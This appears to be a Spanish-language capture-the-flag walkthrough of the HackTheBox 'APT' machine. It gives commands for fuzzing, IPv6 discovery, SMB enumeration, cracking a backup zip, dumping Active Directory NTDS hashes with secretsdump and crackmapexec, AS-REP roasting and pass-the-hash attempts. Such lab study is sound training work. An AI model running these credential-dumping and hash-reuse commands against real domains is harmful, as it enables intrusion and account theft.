# HTB APT Machine

CURL para  ver las cabeceras

```
curl -s -X GET http://10.129.96.60 -I
s Silent 
X indicar tipo de peticion 
I solo para mostrar las cabeceras

```

WFUZZ puedes usar una lista de extenciones definidas 

```
wfuzz -c --hc=404 -t 200 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,zip-php-asp-aspx http://127.0.0.1:8081/FUZZ.FUZ2Z

```


# ¿Qué es msrpc.exe en mi computador?

> Es la implementación de Microsoft (MS) del RPC (remote procedure call), el cual es parte del subconjunto POSIX de Windows.

# IOXIDResolver port 135

Ayuda a ver si se puede obtener la ipv6 de la maquina por e


```
python3 IOXIDResolver.py -t 10.129.96.60

Ver si la ipv6 responde

ping6 dead:beef::b885:d62a:d679:573f

```

# NMAP IPv6

```
nmap -sC -p53,80,88,135,389,445,464,593,636,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49689,52968 -6 dead:beef::b885:d62a:d679:573f -oN targetedipv6
```
# Crackmapexec ipv6

Para usar esta herramienta solo pasa la ipv6 y listo

```
crackmapexec smb dead:beef::b885:d62a:d679:573f

```


# Puertos Abiertos 

Los servicios que se pueden ver y que quiza seria bueno memorizar son:

```
88 Kerberos
389 LDAP
445 SMB
5985 Servicio de Administracion remota de Windows( Si se tuviera credenciales validas podriamos suponer que el usario
es parte del grupo " Remote Managment Users y podriamos conectarnos con evilwinrm) igual se puede hacer con cme

```

## 445 

Para enlistar los recursos compartidos usamos 

### cme

```
crackmapexec smb dead:beef::b885:d62a:d679:573f --shares

```

Con el comando anterior no arroja nada pero probaremos con smbclient

### smbclient

Nombre de la maquina apt 

```
smbclient -L apt/htb.local -N  

```

### Conectarse a un recurso compartido

```
smbclient //htb.local/backup -N
dir 
get archivoadescargar.zip
```

Usando el comando file para ver si realmente es un zip ( recuerda usa los files signatures) para saber el tipo de archivo

```
file backups.zip

```

## 7z Checar que hay dentro 

Para checar dentro usa la "l" si te das cuenta como los comandos que se le pasan a 7z no tienen -

```
7z l backup.zip 

```

Lista lo que hay dentro.

Para descifrar un password primero se saca el hash 

```
zip2john

```
 Ese hash se le pasa a John The Ripper
 
 ```
 john -w:/usr/share/wordlists/rockyou.txt hash
 
 ```
 

# NTDS DUMPEAR hashes 

> Un controlador de dominio es miembro de un único sitio y se representa en el sitio mediante un objeto de servidor Active Directory Domain Services (AD DS). Cada objeto de servidor tiene un objeto NTDS Configuración que representa el controlador de dominio de replicación en el sitio

Cuando se compromete un dominio  se suele dumpear el contenido de NTDS ( en local se dumpea la SAM y el SYSTEM para listar los hashes de los usuarios a nivel local con esos hashes puedes aplicar pass the hash en caso de que aplique y que sea priviligeado el usuario).

Pero volvemos cuando comprometes un controlador de dominio puedes dumpear el NTDS.dir y el SYSTEM para dumpear todos los hashes de los usuarios del directorio activo

```
reg save HKLM\system system.backup
```

## Alternativa cme y con impacket-secretsdump.py

Para esta tenemos que tener credenciales validas de un domain admin.***Importante el kali se usa impacket-packete*** para llamar a secretsdump.py se hace asi:

```
impacket-secretsdump -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL
rackmapexec smb apt -u 'domainadmin' -p 'password' --ntds vss # Intentarra volvarte todos lo hashes a nivel de dominio


```

### sponge 

para evitar que destruyas el archivo recordar 

```
cat hashes | grep " lo que sea " > hashes # destruye el archivo
cat hashes | grep " lo que sea " >> hashes # destruye el archivo poner todo y lo que grepeamos al final
cat hashes | grep " lo que sea " | tee # tampcoo hace lo que queremos por jugar con el mismo archivo
cat hashes | grep " lo que sea " | sponge hashes # este si hace la operacion remplaza lo que queremos y todo lo deja en el mismo archivo


```


# Usuario valido

Una vez que tienes un usuario valido puedes pensar en relizar deiversos ataques Ataque AS-REP Roast:

```
 henry.vinson@htb.local
 
 GetNPUsers.py
 
```
 Se va a intentar solicitar un ticket TGT La idea e que cuando tu dispones de usuarios validos sin tener el pass para que en base a 
 ciertas circunstancias puedas obtener el hash
 
 ```
 python3 GetNPUsers.py htb.local/ -no-pass -usersfile ~/APT/content/valid_users.txt
 [-] User henry.vinson doesn't have UF_DONT_REQUIRE_PREAUTH set

 ```
 
 Osea si esto hubiera funcionada obteniamos el TGT y de ahi pudieramos haber obtenido un password.
 
 ## Checar si el hash es valido para el usuario
 
```
 crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H 'hkajkjkasdkfsa'
 crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H lista_hashes.txt
```
 Aunque tambien se puede checar todos los hashes que obtuvimos pero la maquina nos bloquea todo esto sin exito.
 
 ```
 
 ```






